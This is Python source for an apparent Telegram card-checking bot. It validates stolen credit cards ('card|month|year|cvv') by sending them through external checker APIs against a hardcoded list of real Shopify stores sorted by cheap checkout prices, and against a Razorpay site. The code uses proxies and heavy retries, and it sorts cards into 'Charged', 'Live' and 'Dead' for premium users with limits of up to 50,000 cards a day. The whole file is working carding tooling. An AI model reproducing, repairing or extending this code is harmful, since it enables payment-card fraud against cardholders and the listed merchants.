        return True, 999999
    usage = get_daily_usage(user_id)
    if is_bulk:
        return usage["cc_count"] < 50000, 50000
    return usage["cc_count"] < 150, 150 - usage["cc_count"]
def is_admin(user_id):
    return user_id == ADMIN_ID or user_id in KEY_ADMINS

def is_owner(user_id):
    return user_id == ADMIN_ID
    
def save_verified(user_id):
    users = load_verified_users()
    if str(user_id) not in users:
        with open(VERIFIED_FILE, "a") as f:
            f.write(f"{user_id}\n")
            
SHOPIFY_FIXED_SITES = [
    # ==================== $1.00 - $1.99 ====================
    "https://planterhomawholesale.com",                       # ✅ $1.00
    "https://statelinecryogenics.myshopify.com",              # ✅ $1.00
    "https://thomasville-nc-tourism.myshopify.com",           # ✅ $1.00
    "https://wfywi1-wj.myshopify.com",                        # ✅ $1.00
    "https://factory-direct-blinds-usd.myshopify.com",        # ✅ $1.00
    "https://louisianatrophies.com",                          # ✅ $1.00
    "https://www.mood.design",                                # ✅ $1.00
    "https://katvr.myshopify.com",                            # ✅ $1.00
    "https://koonz-kustomz.myshopify.com",                    # ✅ $1.02
    "https://southern-anchor-ky.myshopify.com",               # ✅ $1.06
    "https://hardware.shopify.com",                           # ✅ $1.09
    "https://unico-arcade.myshopify.com",                     # ✅ $1.09
    "https://fentybeauty.com",                                # ✅ $1.63
    "https://cherryrerun.myshopify.com",                      # ✅ $1.99
    "https://darkenergy.com",                                 # ✅ $1.99
    
    # ==================== $2.00 - $2.99 ====================
    "https://cherry-blossom-10m-5k.myshopify.com",            # ✅ $2.00
    "https://shop.morningbrew.com",                           # ✅ $2.00
    "https://happymugcoffee.com",                             # ✅ $2.00
    "https://bossupentertainment.myshopify.com",              # ✅ $2.05
    "https://www.storeyfamilyfarm.com",                       # ✅ $2.50
    "https://nova-evo.myshopify.com",                         # ✅ $2.89
    "https://dc4t6e-cf.myshopify.com",                        # ✅ $2.99
    
    # ==================== $3.00 - $3.99 ====================
    "https://ninjatransfers.com",                             # ✅ $3.25
    "https://the-stadium-bc.myshopify.com",                   # ✅ $3.59
    "https://the-grapevine-boutique.myshopify.com",           # ✅ $3.99
    "https://thedreammarket16.myshopify.com",                 # ✅ $3.99
    
    # ==================== $4.00 - $4.99 ====================
    "https://shoptheradlab.myshopify.com",                    # ✅ $4.00
    "https://compressionhose.myshopify.com",                  # ✅ $4.00
    "https://mypfc3store.myshopify.com",                      # ✅ $4.00
    "https://kiboubag.com",                                   # ✅ $4.00
    "https://bethanyjoyart.com",                              # ✅ $4.00
    "https://thebetterstuff-9150.myshopify.com",              # ✅ $4.14
    "https://stellas-stickers-studio.myshopify.com",          # ✅ $4.25
    "https://spotteddogcompany.com",                          # ✅ $4.35
    "https://sharetea-everett-online.myshopify.com",          # ✅ $4.35
    "https://test-rhf.myshopify.com",                         # ✅ $4.38
    "https://kingdomcomecards.com",                           # ✅ $4.48
    "https://stephanie-kiker-designs.myshopify.com",          # ✅ $4.50
    "https://doubleoutlines.com",                             # ✅ $4.99
    
    # ==================== $5.00 - $5.99 ====================
    "https://wakeupzuzi.myshopify.com",                       # ✅ $5.00
    "https://raisingcanesgear.com",                           # ✅ $5.00
    "https://nativeseeds.org",                                # ✅ $5.00
    "https://rudysbarnyc.com",                                # ✅ $5.00
    "https://shopifyrebellion.gg",                            # ✅ $5.00
    "https://thatokshop.myshopify.com",                       # ✅ $5.07
    "https://tackleboxtitans.myshopify.com",                  # ✅ $5.26
    "https://www.mymedictr.org",                              # ✅ $5.37
    "https://www.allways99pr.com",                            # ✅ $5.49
    "https://forwardfruitdesign.com",                         # ✅ $5.60
    "https://the-mitten-state.myshopify.com",                 # ✅ $5.74
    "https://ptscoffee.com",                                  # ✅ $5.75
    "https://summitmusichall.myshopify.com",                  # ✅ $5.90
    "https://tvwitbwllc.myshopify.com",                       # ✅ $5.90
    "https://tipsey-life.myshopify.com",                      # ✅ $5.95
    "https://jewelry-box-inc.myshopify.com",                  # ✅ $5.95
    "https://zprypp-bw.myshopify.com",                        # ✅ $5.99
    
    # ==================== $6.00 - $6.99 ====================
    "https://wick-wonder-8314.myshopify.com",                 # ✅ $6.00
    "https://the-stadium-bc-bay-city.myshopify.com",          # ✅ $6.28
    "https://theturkeyhunterpodcast.myshopify.com",           # ✅ $6.45
    "https://what-goes-around-abq.myshopify.com",             # ✅ $6.49
    "https://thinkjinx.myshopify.com",                        # ✅ $6.53
    "https://wedalife.myshopify.com",                         # ✅ $6.90
    "https://ycwpti-6k.myshopify.com",                        # ✅ $6.90
    "https://u-slash-designs.myshopify.com",                  # ✅ $6.95
    
    # ==================== $7.00+ ====================
    "https://thegrowercircle.myshopify.com",                  # ✅ $7.00
    "https://theradiancefoundation.myshopify.com",            # ✅ $7.00
    "https://wildhoneybox.myshopify.com",                     # ✅ $7.00
]

def load_sites():
    return SHOPIFY_FIXED_SITES  # Puri list return karega
    

def make_result_card():
    img = Image.new("RGB", (800, 600), "#111827")
    draw = ImageDraw.Draw(img)

    QURESHIxOTP_font = None
    for _fp in ("DejaVuSans.ttf", "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf",
                "C:/Windows/Fonts/arial.ttf", "/System/Library/Fonts/Supplemental/Arial.ttf"):
        try:
            QURESHIxOTP_font = ImageFont.truetype(_fp, 70)
            break
        except Exception:
            continue
    if QURESHIxOTP_font is None:
        QURESHIxOTP_font = ImageFont.load_default()

    draw.text(
        (80, 250),
        "⚡ Powered By QURESHIxOTP",
        font=QURESHIxOTP_font,
        fill=(0, 200, 255)
    )

    img.save("result_card.png")

# ==================== FAST CONCURRENT API CHECK (25 APIs at once = seconds) ====================
# ==================== SAFE API HEALTH CHECKS ====================
# These endpoints are harmless public GET endpoints. They are used only by
# /checkapi, /testapis and the admin API-check buttons. The card/payment API
# configuration above is intentionally not touched.
HEALTH_API_MAP = {
    f"api{i}": f"https://httpbin.org/status/200?health_api={i}"
    for i in range(1, 26)
}

async def _fast_api_check_all():
    """Check 25 harmless HTTP health endpoints concurrently.
    WORKING is shown only when the endpoint actually responds with 2xx/3xx.
    """
    api_items = sorted(HEALTH_API_MAP.items(), key=lambda x: int(x[0].replace('api', '')))
    timeout = aiohttp.ClientTimeout(total=12)
    connector = aiohttp.TCPConnector(limit=25, ssl=False)
    headers = {"User-Agent": "API-Health-Checker/1.0"}

    async def _probe_one(session, idx_api):
        idx, (key, api_url) = idx_api
        try:
            async with session.get(api_url, allow_redirects=True) as resp:
                if 200 <= resp.status < 400:
                    return idx, True, resp.status
                return idx, False, resp.status
        except (asyncio.TimeoutError, aiohttp.ClientError, OSError) as exc:
            return idx, False, type(exc).__name__
        except Exception as exc:
            return idx, False, type(exc).__name__

    async with aiohttp.ClientSession(timeout=timeout, connector=connector, headers=headers) as session:
        probe_results = await asyncio.gather(
            *[_probe_one(session, item) for item in enumerate(api_items, 1)],
            return_exceptions=False
        )

    results = []
    working = 0
    dead = 0
    for idx, alive, detail in probe_results:
        if alive:
            working += 1
            results.append(f"\u2705 **API {idx}** \u2192 \U0001F7E2 WORKING")
        else:
            dead += 1
            results.append(f"\u274c **API {idx}** \u2192 \U0001F534 DEAD")

    return results, working, dead

@bot.on(events.NewMessage(pattern='/checkapi'))
async def check_api_now(event):
    if not is_owner(event.sender_id):
        await event.reply(premium_emoji("\u274c **Access Denied**\n\nOnly the owner can use API checks."))
        return
    t0 = time.time()
    status_msg = await event.reply(premium_emoji("\u26a1 **Checking 25 APIs (Turbo)...**"))
    results, working, dead = await _fast_api_check_all()
    elapsed = round(time.time() - t0, 1)
    final_msg = f"""\u26a1 API STATUS CHECK \u26a1
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
{chr(10).join(results)}
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
\u2705 Working: {working}
\u274c Dead: {dead}
\u23f1 Time: {elapsed}s (\u26a1 Turbo)"""
    try:
        await status_msg.edit(premium_emoji(final_msg), parse_mode="html")
    except Exception:
        await event.reply(premium_emoji(final_msg), parse_mode="html")


def extract_cc(text):
    """Extract CC from text in format: card|month|year|cvv"""
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

def is_dead_site_error(msg):
    if not msg:
        return True

    msg = str(msg).lower()
    return any(x in msg for x in _DEAD_INDICATORS)
    
async def get_bin_info(card_number):
    """Get BIN info from API"""
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=20)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                if res.status != 200:
                    return 'BIN Info Not Found', '-', '-', '-', '-', ''
                response_text = await res.text()
                try:
                    data = json.loads(response_text)
                    brand = data.get('brand', '-')
                    bin_type = data.get('type', '-')
                    level = data.get('level', '-')
                    bank = data.get('bank', '-')
                    country = data.get('country_name', '-')
                    flag = data.get('country_flag', '')
                    return brand, bin_type, level, bank, country, flag
                except json.JSONDecodeError:
                    return '-', '-', '-', '-', '-', ''
    except Exception:
        return '-', '-', '-', '-', '-', ''
# ============================================================
# GLOBAL VARIABLES — SIRF COUNT (PAUSE NAHI)
# ============================================================
API_FAIL_COUNT = 0
API_FAIL_LOCK = asyncio.Lock()

# ============================================================
# check_card — PAUSE HATAYA, SIRF COUNT + RETRY
# ============================================================
async def check_card(card, site, proxy, api_url=None):  # ✅ ADD api_url PARAMETER
    """HAR ERROR = SITE ERROR → AUTO-DELETE + API ROTATION + FAST"""
    global API_FAIL_COUNT
    
    # ✅ AGAR API_URL NAHI DIYA TO API-11 USE KARO
    if not api_url:
        api_url = get_api_single()  # Default API-11
    
    max_retries = 2  # ✅ SIRF 2 RETRY
    
    for attempt in range(max_retries):
        try:
            parts = card.split('|')
            if len(parts) != 4:
                return {
                    'status': 'Site Error',
                    'message': 'Invalid card format',
                    'card': card,
                    'site': site,
                    'gateway': 'Unknown',
                    'price': '-',
                    'retry': True
                }

            if not site.startswith("http"):
                site = f"https://{site}"

            # ✅ PROXY FORMAT (proxyfix): proxy AS-IS bhejo — wahi raw format jo
            # check_proxy / test_proxy use karte hain (ip:port:user:pass | socks5://ip:port |
            # user:pass@host:port). Purana 4-part→http:// conversion API ko galat format
            # deta tha = proxy lagne par 'invalid proxy format' / Site Error aate the.
            if not proxy or not str(proxy).strip():
                return {
                    'status': 'Site Error',
                    'message': 'No proxy provided',
                    'card': card,
                    'site': site,
                    'gateway': 'Unknown',
                    'price': '-',
                    'retry': True
                }
            proxy = str(proxy).strip()

            # ✅ API URL USE KARO (JO PASS KIYA HAI)
            url = f"{api_url}?site={site}&cc={card}&proxy={proxy}"

            timeout = aiohttp.ClientTimeout(total=120, connect=45, sock_read=120)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(url) as resp:
                    raw = await resp.json(content_type=None)

            response_msg = str(raw.get('Response', '')).strip()
            
            # ✅ KISI BHI TYPE KA LINK HATANA
            if 'http' in response_msg or '.vercel.app' in response_msg or '.railway.app' in response_msg or '.up.railway.app' in response_msg:
                response_msg = 'API Response'
            
            # ✅ PAYMENTS_CREDIT_CARD HATANA
            if 'PAYMENTS_CREDIT_CARD' in response_msg:
                response_msg = response_msg.replace('PAYMENTS_CREDIT_CARD', '').strip()
                if not response_msg:
                    response_msg = 'API Response'
            
            price = raw.get('Price', '-')
            gate = raw.get('Gateway', raw.get('Gate', '𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮'))
            status = raw.get('Status', '')
            api_status = raw.get('Status', False)

            response_lower = response_msg.lower()

            # ✅ SITE DEAD / ERROR DETECTION
            if any(x in response_lower for x in SITE_DEAD_TRIGGERS):
                async with API_FAIL_LOCK:
                    API_FAIL_COUNT += 1
                    print(f"⚠️ API Fail #{API_FAIL_COUNT} — {site[:50]}")
                
                if attempt < max_retries - 1:
                    continue  # ← NO SLEEP!
                
                return {
                    "status": "Site Error",
                    "message": response_msg[:150] if response_msg else "Site Error",
                    "card": card,
                    "retry": True,
                    "gateway": gate,
                    "price": price,
                    "site": site
                }

            # ✅ SUCCESS — RESET COUNT
            async with API_FAIL_LOCK:
                if API_FAIL_COUNT > 0:
                    print(f"✅ API Success — Reset count from {API_FAIL_COUNT} to 0")
                    API_FAIL_COUNT = 0

            # ✅ CHARGED / HIT DETECTION
            CHARGED_TRIGGERS = [
                "charged", "order completed", "order_placed", "order_paid",
                "insufficient_funds", "thank you", "payment successful", "💎"
            ]
            
            if status == "Charged" or any(x in response_lower for x in CHARGED_TRIGGERS):
                return {
                    'status': 'Charged',
                    'message': response_msg[:150] if response_msg else "Charged",
                    'card': card,
                    'site': site,
                    'gateway': gate,
                    'price': price,
                    'retry': False
                }

            # ✅ APPROVED / LIVE DETECTION
            APPROVED_TRIGGERS = [
                'otp_required', '3ds_required', 'approved', 'success', 'invalid_cvv',
                'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc',
                'invalid cvv', 'incorrect cvv', 'invalid cvc',
                'incorrect cvc', 'incorrect_zip', 'incorrect zip'
            ]
            
            if status == 'Approved' or any(x in response_lower for x in APPROVED_TRIGGERS):
                return {
                    'status': 'Approved',
                    'message': response_msg[:150] if response_msg else "Approved",
                    'card': card,
                    'site': site,
                    'gateway': gate,
                    'price': price,
                    'retry': False
                }

            # ✅ DECLINED / DEAD CARD
            if "card_declined" in response_lower or "declined" in response_lower:
                return {
                    'status': 'Dead',
                    'message': response_msg[:150] if response_msg else "CARD_DECLINED",
                    'card': card,
                    'site': site,
                    'gateway': gate,
                    'price': price,
                    'retry': False
                }

            # ✅ API STATUS FALSE = SITE ERROR
            if not api_status:
                async with API_FAIL_LOCK:
                    API_FAIL_COUNT += 1
                    print(f"⚠️ API Fail #{API_FAIL_COUNT} (Status False) — {site[:50]}")
                
                if attempt < max_retries - 1:
                    continue  # ← NO SLEEP!
                
                return {
                    'status': 'Site Error',
                    'message': response_msg[:150] if response_msg else "API Status False",
                    'card': card,
                    'retry': True,
                    'gateway': gate,
                    'price': price,
                    'site': site
                }

            # ✅ UNKNOWN = SITE ERROR
            return {
                'status': 'Site Error',
                'message': response_msg[:150] if response_msg else "Unknown Error",
                'card': card,
                'retry': True,
                'gateway': gate,
                'price': price,
                'site': site
            }

        except asyncio.TimeoutError:
            async with API_FAIL_LOCK:
                API_FAIL_COUNT += 1
                print(f"⚠️ API Fail #{API_FAIL_COUNT} (Timeout) — {site[:50]}")
            
            if attempt < max_retries - 1:
                continue  # ← NO SLEEP!
            
            return {
                'status': 'Site Error',
                'message': 'Request timeout',
                'card': card,
                'retry': True,
                'gateway': '𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮',
                'price': '-',
                'site': site
            }
        
        except json.JSONDecodeError as e:
            async with API_FAIL_LOCK:
                API_FAIL_COUNT += 1
                print(f"⚠️ API Fail #{API_FAIL_COUNT} (JSON Error) — {site[:50]}")
            
            if attempt < max_retries - 1:
                continue  # ← NO SLEEP!
            
            return {
                'status': 'Site Error',
                'message': f'Invalid JSON: {str(e)[:50]}',
                'card': card,
                'retry': True,
                'gateway': '𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮',
                'price': '-',
                'site': site
            }
        
        except Exception as e:
            async with API_FAIL_LOCK:
                API_FAIL_COUNT += 1
                print(f"⚠️ API Fail #{API_FAIL_COUNT} (Exception) — {site[:50]}")
            
            if attempt < max_retries - 1:
                continue  # ← NO SLEEP!
            
            return {
                'status': 'Site Error',
                'message': f'Error: {str(e)[:80]}',
                'card': card,
                'retry': True,
                'gateway': '𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮',
                'price': '-',
                'site': site
            }
    
    # ✅ AGAR SAB RETRIES FAIL HO JAYEIN
    return {
        'status': 'Site Error',
        'message': f'All {max_retries} retries failed',
        'card': card,
        'retry': True,
        'gateway': '𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮',
        'price': '-',
        'site': site
    }
@bot.on(events.NewMessage(pattern=r'^/split\s+(\d+)$'))
async def split_cards_command(event):
    user_id = event.sender_id
    
    # ✅ सिर्फ Premium/Admin के लिए (चाहे तो हटा सकते हो)
    if not is_premium(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("❌ **Access Denied**\n\nOnly premium/admin can use this command."))
        return

    # ✅ कितने cards per file चाहिए
    try:
        per_file = int(event.pattern_match.group(1))
        if per_file < 1:
            raise ValueError
    except:
        await event.reply(premium_emoji("❌ Usage: `/split 100` (100 cards per file)"))
        return

    # ✅ Reply की हुई file चाहिए
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Reply to a .txt file with `/split 100`"))
        return

    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not str(reply_msg.file.name).endswith('.txt'):
        await event.reply(premium_emoji("❌ Sirf .txt file reply kar."))
        return

    status_msg = await event.reply(premium_emoji("🔄 Processing file..."))

    # ✅ File download karo
    file_path = await reply_msg.download_media()
    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()
    
    # ✅ CCs extract karo
    cards = extract_cc(content)
    
    # ✅ File delete karo (cleanup)
    try: os.remove(file_path)
    except: pass

    if not cards:
        await status_msg.edit(premium_emoji("❌ No valid CCs found in file."))
        return

    total_cards = len(cards)
    await status_msg.edit(premium_emoji(f"🔄 Splitting {total_cards} cards into {per_file} per file..."))

    # ✅ चंक्स में बाँटो
    chunks = [cards[i:i + per_file] for i in range(0, len(cards), per_file)]
    
    sent = 0
    failed = 0

    for idx, chunk in enumerate(chunks, 1):
        try:
            # ✅ हर चंक के लिए अलग file बनाओ
            timestamp = datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%Y%m%d_%H%M%S")
            filename = f"split_{idx}_{timestamp}.txt"
            
            async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
                for card in chunk:
                    await f.write(f"{card}\n")
            
            # ✅ File bhejo
            await bot.send_message(
                user_id,
                premium_emoji(f"📄 **Part {idx}** – {len(chunk)} cards"),
                file=filename,
                parse_mode="html"
            )
            
            sent += 1
            await asyncio.sleep(0.5)  # थोड़ा गैप
            
            # ✅ File delete karo
            try: os.remove(filename)
            except: pass
            
        except Exception as e:
            failed += 1
            print(f"❌ Split file error: {e}")

    await status_msg.edit(premium_emoji(f"""✅ **Split Complete!**

📊 Total Cards: <code>{total_cards}</code>
📦 Per File: <code>{per_file}</code>
📁 Total Files: <code>{len(chunks)}</code>
✅ Sent: <code>{sent}</code>
❌ Failed: <code>{failed}</code>
━━━━━━━━━━━━━━━━━━━━
💡 Use /chk on each file now!"""), parse_mode="html")


    
async def update_progress(user_id, message_id, results, current_attempt_count, first_name="User", is_razorpay=False):
    """2 APIs ka combined progress - EK HI MSG + LOGS + OLD STYLE BUTTONS"""
    
    charged = len(results.get('charged', []))
    approved = len(results.get('approved', []))
    dead = len(results.get('dead', []))
    errors = results.get('errors', 0)
    total = results.get('total', 0)
    checked = current_attempt_count
    
    percentage = round((checked / total) * 100, 1) if total > 0 else 0
    
    # ✅ REAL TIME IST
    ist = pytz.timezone('Asia/Kolkata')
    now = datetime.now(ist)
    current_time = now.strftime("%I:%M:%S %p IST")
    
    # ✅ PROGRESS BAR
    bar_length = 20
    filled = int((checked / total) * bar_length) if total > 0 else 0
    bar = "▓" * filled + "░" * (bar_length - filled)
    
    # ✅ LAST CC + RESPONSE
    last_cc = "—"
    last_price = "—"
    last_response = "—"
    
    if results.get('last_result'):
        last_result = results['last_result']
        last_cc = last_result.get('card', '—')
        last_price = last_result.get('price', '—')
        raw_msg = str(last_result.get('message', '—'))
        if 'http' in raw_msg or '.vercel.app' in raw_msg or '.railway.app' in raw_msg or '.up.railway.app' in raw_msg:
            last_response = 'API Response'
        elif 'PAYMENTS_CREDIT_CARD' in raw_msg:
            last_response = raw_msg.replace('PAYMENTS_CREDIT_CARD', '').strip()
            if not last_response:
                last_response = 'API Response'
        else:
            last_response = raw_msg[:60]
    
    # ✅ PLAN
    if is_admin(user_id):
        plan = "👑 Admin"
    elif is_premium(user_id):
        plan = "💎 Premium"
    else:
        plan = "⭐ Free"
    
    # ✅ LOGS PRINT (Console mein dikhega)
    print(f"\n📊 PROGRESS: {percentage}% | {checked}/{total} cards")
    print(f"   ✅ Approved: {approved} | 💎 Charged: {charged} | ❌ Dead: {dead} | ⚠️ Errors: {errors}")
    print(f"   💳 Last CC: {last_cc} | 💰 Price: {last_price} | 📝 Response: {last_response}")
    
    text = f"""<b>⚡ Smart Checking ✅</b>
━━━━━━━━━━━━━━━━━━━━
<b>🔄 Progress:</b> {bar}
<b>{percentage}%</b> | <code>{checked}/{total}</code>
━━━━━━━━━━━━━━━━━━━━
<b>💳 CC ➜ <code>{last_cc}</code></b>
<b>💰 Price ➜ <code>{last_price}</code></b>
<b>❌ Res ➜ <code>{last_response}</code></b>
━━━━━━━━━━━━━━━━━━━━
<b>✅ Approved ➜ {approved}</b>
<b>💎 Charged ➜ {charged}</b>
<b>❌ Dead ➜ {dead}</b>
<b>⚠️ Errors ➜ {errors}</b>
━━━━━━━━━━━━━━━━━━━━
<b>⏳ Time ➜ {current_time}</b>
<b>👑 Checked By ➜ <a href="tg://user?id={user_id}">{first_name}</a> [{plan}]</b>
━━━━━━━━━━━━━━━━━━━━
<b>🤖 Bot By: ⧼ 𝗗𝗲𝗳𝗳⁺⁺ ⧽ QURESHIxOTP</b>"""
    
    # ✅ BUTTONS - OLD STYLE (Primary/Danger)
    buttons = [
        [
            Button.inline(f"🔥 𝗟𝗶𝘃𝗲 ({approved})", f"live_{message_id}".encode(), style="success"),
            Button.inline(f"💎 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 ({charged})", f"charged_{message_id}".encode(), style="primary")
        ],
        [
            Button.inline(f"❌ 𝗗𝗘𝗔𝗗 ({dead})", f"dead_{message_id}".encode(), style="danger"),
            Button.inline("𝗦𝘁𝗼𝗽", f"stop_{message_id}".encode(), style="danger")
        ]
    ]
    
    try:
        await bot.edit_message(user_id, message_id, premium_emoji(text), buttons=buttons, parse_mode="html")
    except Exception as e:
        print(f"Update progress edit error: {e}")
# ==================== LIVE BUTTON ====================

async def check_one_site(session, site):
    try:
        if not site.startswith("http"):
            site = "https://" + site

        async with session.get(
            site,
            allow_redirects=True
        ) as resp:

            if resp.status < 500:
                return site, True
            return site, False

    except:
        return site, False


async def fast_site_check(sites):

    timeout = aiohttp.ClientTimeout(total=8)

    connector = aiohttp.TCPConnector(
        limit=50,
        ssl=False
    )

    async with aiohttp.ClientSession(
        timeout=timeout,
        connector=connector
    ) as session:

        tasks = [
            check_one_site(session, site)
            for site in sites
        ]

        results = await asyncio.gather(*tasks)

    alive = []
    dead = 0

    for site, ok in results:
        if ok:
            alive.append(site)
        else:
            dead += 1

    return alive, dead
async def check_card_razorpay(card, proxy, amount=1):
    """60X NUCLEAR Razorpay Checker - 60 Hard Retries + Smart Recovery"""
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card, 'gateway': 'Razorpay', 'price': '-'}

        site = RAZORPAY_FIXED_SITE
        base_url = f"{RAZORPAY_API_BASE}?Key=aiojames&Site={site}&amount={amount}&cc={card}&proxy={proxy}"
        
        timeout = aiohttp.ClientTimeout(total=120, connect=45, sock_read=120)
        
        for attempt in range(60):  # 60
            try:
                url = base_url
                
                async with aiohttp.ClientSession(timeout=timeout) as session:
                    async with session.get(url, ssl=False) as resp:
                        raw_text = await resp.text()
                        raw_text = raw_text.strip()
                
                if not raw_text or len(raw_text) < 5:
                    if attempt < 59:  # ✅ 59
                        await asyncio.sleep(0.8 + (attempt * 0.15))
                        continue
                    return {'status': 'Dead', 'message': 'Empty Response', 'card': card, 'gateway': 'Razorpay', 'price': '-'}

                if raw_text.startswith('<') or not raw_text.startswith('{'):
                    if attempt < 59:  # ✅ 59
                        await asyncio.sleep(2.2 + (attempt * 0.2))
                        continue
                    return {'status': 'Dead', 'message': f'Bad Response: {raw_text[:80]}', 'card': card, 'gateway': 'Razorpay', 'price': '-'}

                raw = None
                for json_attempt in range(16):  # 16
                    try:
                        raw = json.loads(raw_text)
                        break
                    except json.JSONDecodeError as je:
                        if attempt < 59 and json_attempt < 15:  # ✅ 59, 15
                            await asyncio.sleep(0.6)
                            async with aiohttp.ClientSession(timeout=timeout) as session:
                                async with session.get(url, ssl=False) as retry_resp:
                                    raw_text = (await retry_resp.text()).strip()
                            continue
                        else:
                            if attempt < 59:  # ✅ 59
                                await asyncio.sleep(2.0 + attempt * 0.1)
                                continue
                            return {'status': 'Dead', 'message': f'Invalid JSON: {str(je)[:80]}', 'card': card, 'gateway': 'Razorpay', 'price': '-'}

                if raw is None:
                    continue

                response_msg = str(raw.get('response', raw.get('Response', raw.get('message', '')))).strip()
                price = str(raw.get('Price', amount))
                status_str = str(raw.get('status', raw.get('success', ''))).lower()
                gate = "Razorpay"

                if any(x in status_str for x in ["charged", "success", "true"]) or any(x in response_msg.lower() for x in ["charged","order completed","order_placed","order_paid","insufficient_funds","thank you","payment successful"]):
                    return {'status':'Charged','message':response_msg,'card':card,'site':site,'gateway':gate,'price':price}

                elif any(x in status_str for x in ["approved", "success"]) or "otp" in response_msg.lower():
                    return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}

                else:
                    return {'status': 'Dead', 'message': response_msg or "DECLINED", 'card': card, 'site': site, 'gateway': gate, 'price': price}

            except asyncio.TimeoutError:
                if attempt < 59:  # ✅ 59⁹
                    await asyncio.sleep(2.0 + attempt * 0.2)
                    continue
                return {'status': 'Dead', 'message': 'Timeout', 'card': card, 'gateway': 'Razorpay', 'price': '-'}

            except Exception as e:
                error_str = str(e).lower()
                if "expecting value" in error_str or "json" in error_str or "connection" in error_str:
                    if attempt < 59:  # ✅ 59
                        await asyncio.sleep(2.3 + (attempt * 0.18))
                        continue
                if attempt < 59:  # ✅ 59
                    await asyncio.sleep(2.0)
                    continue
                return {'status': 'Dead', 'message': f'Error: {str(e)[:120]}', 'card': card, 'gateway': 'Razorpay', 'price': '-'}

        return {'status': 'Dead', 'message': 'Max 60 retries exceeded', 'card': card, 'gateway': 'Razorpay', 'price': '-'}

    except Exception as e:
        return {'status': 'Dead', 'message': f'Outer Error: {str(e)[:100]}', 'card': card, 'gateway': 'Razorpay', 'price': '-'}

# ==================== FILE PATHS ====================
SITES_FILE = 'sites.txt'              # Terminal global sites (admin edit)
PROXY_FILE = 'proxy.txt'              # Terminal global proxies (admin edit)  
USER_SITES_FILE = 'user_sites.json'   # User personal sites (auto-managed)

# ==================== USER SITE FUNCTIONS ====================
async def load_user_sites():
    if not os.path.exists(USER_SITES_FILE):
        return {}
    try:
        with open(USER_SITES_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

async def save_user_sites(data):
    with open(USER_SITES_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4)

def get_user_sites_sync(user_id):
    if not os.path.exists(USER_SITES_FILE):
        return []
    try:
        with open(USER_SITES_FILE, 'r', encoding='utf-8') as f:
            data = json.load(f)
        return data.get(str(user_id), [])
    except:
        return []

async def add_user_site(user_id, site):
    data = await load_user_sites()
    user_sites = data.get(str(user_id), [])
    if site not in user_sites:
        user_sites.append(site)
        data[str(user_id)] = user_sites
        await save_user_sites(data)
        return True
    return False

async def test_proxy(proxy):
    """Test a single proxy - SOCKS4/SOCKS5/HTTP/HTTPS (proxyfix: API fail → direct test fallback)"""
    r = await check_proxy(proxy)
    return {"proxy": proxy, "status": "alive" if r.get("alive") else "dead"}


async def remove_user_site(user_id, site):
    data = await load_user_sites()
    user_sites = data.get(str(user_id), [])
    if site in user_sites:
        user_sites.remove(site)
        if user_sites:
            data[str(user_id)] = user_sites
        else:
            data.pop(str(user_id), None)
        await save_user_sites(data)
        return True
    return False

async def clear_user_sites(user_id):
    data = await load_user_sites()
    if str(user_id) in data:
        del data[str(user_id)]
        await save_user_sites(data)
        return True
    return False

# ==================== /addsites - USER PERSONAL SHOPIFY SITE ====================

# ==================== /rmsites - REMOVE USER'S SHOPIFY SITE ====================

@bot.on(events.NewMessage(pattern=r'^/site$'))
async def site_check_command(event):
    user_id = event.sender_id

    # ✅ ADMIN: Manual + Bot sites dono
    # ✅ USER: Sirf apni manual sites
    if is_admin(user_id):
        user_sites = get_user_sites_sync(user_id)
        global_sites = load_sites()
        sites = list(set(user_sites + global_sites))
        site_type = "Admin (Manual + Bot)"
    else:
        sites = get_user_sites_sync(user_id)
        site_type = "Manual"
    
    if not sites:
        if is_admin(user_id):
            sites = load_sites()
            site_type = "Bot Sites"
        else:
            await event.reply(premium_emoji("""❌ **No sites available!**

📌 **Add your sites first:**
<code>/addsites https://yoursite.com</code>

💡 **Check your sites:**
<code>/mysites</code>"""), parse_mode="html")
            return

    msg = await event.reply(premium_emoji(f"""<b>⚡ Site Checker Started</b>

👤 <b>Mode:</b> {site_type}
📊 <b>Total Sites:</b> <code>{len(sites)}</code>
🔍 <b>Checking...</b>"""), parse_mode="html")

    # ✅ FAST CHECK - Simple HTTP status
    alive, dead = await fast_site_check(sites)
    
    # ✅ Working sites TXT bhejo
    if alive:
        txt_file = f"working_sites_{user_id}.txt"
        with open(txt_file, "w") as f:
            f.write("\n".join(alive))
        await bot.send_message(user_id, f"📄 **{len(alive)} Working Sites**", file=txt_file)
